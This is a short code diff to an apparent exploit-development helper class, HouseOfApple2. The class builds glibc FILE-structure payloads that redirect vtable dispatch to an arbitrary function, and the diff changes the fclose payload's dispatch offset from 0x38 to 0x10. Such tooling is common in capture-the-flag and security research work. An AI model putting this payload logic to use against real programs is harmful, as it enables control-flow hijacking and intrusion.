@@ -59,7 +59,7 @@ class HouseOfApple2:
         return self.payload(base_ptr, arbitrary_func, dispatch_offset=0x40, arg=arg)
 
     def fclose_payload(self, base_ptr, arbitrary_func, arg=None):
-        return self.payload(base_ptr, arbitrary_func, dispatch_offset=0x38, arg=arg)
+        return self.payload(base_ptr, arbitrary_func, dispatch_offset=0x10, arg=arg)
 
     def payload(self, base_ptr, arbitrary_func, dispatch_offset=0x38, arg=None):
         io_wfile_overflow = self._libc_io_wfile_jumps + 0x8 * 3
